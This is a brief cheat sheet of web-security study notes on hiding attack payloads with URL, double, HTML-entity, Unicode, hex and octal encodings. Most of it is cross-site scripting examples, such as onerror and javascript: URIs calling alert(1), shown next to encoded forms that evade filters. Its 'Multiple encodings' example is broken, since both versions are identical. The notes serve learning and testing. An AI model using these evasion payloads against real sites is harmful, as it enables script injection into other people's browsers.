# Obfuscating attacks using encodings

Both clients and servers use a variety of different encodings to pass data between systems. When they want to actually use the data, this often means they have to decode it first. The exact sequence of decoding steps that are performed depends on the context in which the data appears. For example, a query parameter is typically URL decoded server-side, while the text content of an HTML element may be HTML decoded client-side.

When constructing an attack, you should think about where exactly your payload is being injected. If you can infer how your input is being decoded based on this context, you can potentially identify alternative ways to represent the same payload. 

### Encode as URL

```http2
/?search=Fish & Chips
```


```http2
/?search=Fish+%26+Chips
```

### Double encoding as URL

| Character | Percent encoded | Double encoded  |
| --------- |:---------------:| ---------------:|
|     <     |       %3C       |      %253C      |
|     >     |       %3E       |      %253E      |
|     /     |       %2F       |      %252F      |

### HTML encoding

```html
<img src=x onerror="alert(1)">
```

```html
<img src=x onerror="&#x61;lert(1)">
```

### Leading zeros

```html
<a href="javascript:alert(1)">Click me</a>
```

HTML Encoding: ":"

```html
<a href="javascript&#058;alert(1)">Click me</a>
```

Add zeros

```html
<a href="javascript&#00000000000058;alert(1)">Click me</a>
```

### Unicode escaping

```js
eval("alert(1)")
```

```js
eval("\u0061lert(1)")
```

https://dencode.com/string/unicode-escape

### ASCII Hex encoding

```js
eval("alert")
```

```js
eval("\x61lert")
```

Prefixed with \x

### ASCII Octal encoding

```js
eval("alert")
```

```js
eval("\141lert")
```

Prefixed with \

### Multiple encodings

```html
<a href="javascript:alert(1)">Click me</a>
```

```html
<a href="javascript:alert(1)">Click me</a>
```

https://onlinestringtools.com/convert-string-to-octal

#### References:

https://portswigger.net/web-security/reference/obfuscating-attacks-using-encodings

https://subscription.packtpub.com/book/networking-and-servers/9781785284588/1/ch01lvl1sec11/double-encoding
